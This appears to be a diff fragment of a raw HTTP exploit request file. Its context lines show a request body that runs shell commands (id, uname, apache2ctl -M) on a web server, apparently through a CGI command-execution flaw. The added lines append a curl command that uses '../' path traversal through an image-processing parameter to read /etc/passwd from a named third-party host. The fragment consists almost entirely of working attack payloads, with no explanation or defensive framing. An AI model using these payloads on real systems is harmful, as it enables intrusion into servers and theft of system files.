@@ -11,3 +11,9 @@ If-Modified-Since: Wed, 06 Oct 2021 05:38:33 GMT
 Connection: close
 Content-Length: 60
 echo Content-Type: text/plain; echo; id; uname;apache2ctl -M
+
+
+
+
+echo;curl --path-as-is https://browserimg.nearme.com.cn/cover-009743986e61404aa900a31e37465a8a.png?x-oss-process=/../../../../../../../../etc/passwd
+
